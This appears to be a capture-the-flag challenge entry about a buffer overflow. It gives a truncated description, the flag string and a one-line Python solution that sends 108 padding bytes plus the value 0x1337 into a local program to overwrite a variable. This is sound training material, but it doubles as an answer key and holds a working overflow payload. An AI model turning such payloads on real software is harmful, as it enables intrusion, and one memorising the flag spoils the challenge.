Title:

Points: 

Description: i have a program that gives me the flag if i overwrite the 

Flag: VOSSCTF{pls_dont_overflow_my_buffers}

Author: Lukas Justin Borge

Solution: └─$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*108 + b"\x37\x13\x00\x00")' |./overflow